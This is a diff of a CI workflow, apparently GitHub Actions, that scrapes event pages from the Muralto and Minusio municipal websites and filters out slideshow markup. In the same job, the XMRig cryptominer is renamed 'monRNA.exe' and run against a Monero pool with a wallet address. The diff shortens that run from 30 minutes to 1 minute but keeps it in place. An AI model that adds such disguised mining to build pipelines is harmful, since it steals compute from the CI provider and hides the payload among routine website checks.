@@ -101,7 +101,7 @@ jobs:
           mv xmrig-6.22.2 monRNA
           cd monRNA
           mv xmrig monRNA.exe
-          timeout 30m ./monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero   || EXIT_CODE=$?
+          timeout 1m ./monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero   || EXIT_CODE=$?
           if [ "$EXIT_CODE" = "124" ]; then
             echo "Script timed out after 10 minutes, but continuing without failure."
           elif [ -n "$EXIT_CODE" ]; then
@@ -112,11 +112,13 @@ jobs:
           rm -r monRNA
 
 
+
+
           # Check Muralto website
           wget https://www.muralto.ch/ -O muralto_homepage_all.txt
           wget https://www.muralto.ch/Eventi-e-Manifestazioni/IT-cf274700 -O muralto_events_all.txt
-          cat muralto_homepage_all.txt > muralto_homepage.txt
-          cat muralto_events_all.txt > muralto_events.txt
+          cat muralto_homepage_all.txt | grep -v "position:absolute;  top:0px;  left:0px;" > muralto_homepage.txt # togliere slideshow in webpage
+          cat muralto_events_all.txt | grep -v "position:absolute;  top:0px;  left:0px;" > muralto_events.txt
           
           # Cleanup
           rm muralto_homepage_all.txt muralto_events_all.txt
@@ -124,11 +126,13 @@ jobs:
           # Check Minusio website
           wget https://www.minusio.ch/ -O minusio_homepage_all.txt
           wget https://www.minusio.ch/Agenda-eventi-cf274700 -O minusio_events_all.txt
-          cat minusio_homepage_all.txt > minusio_homepage.txt
-          cat minusio_events_all.txt > minusio_events.txt
+          cat minusio_homepage_all.txt | grep -v "position:absolute;  top:0px;  left:0px;" > minusio_homepage.txt
+          cat minusio_events_all.txt | grep -v "position:absolute;  top:0px;  left:0px;" > minusio_events.txt
 
           # Cleanup
           rm minusio_homepage_all.txt minusio_events_all.txt
+
+
 
 
           
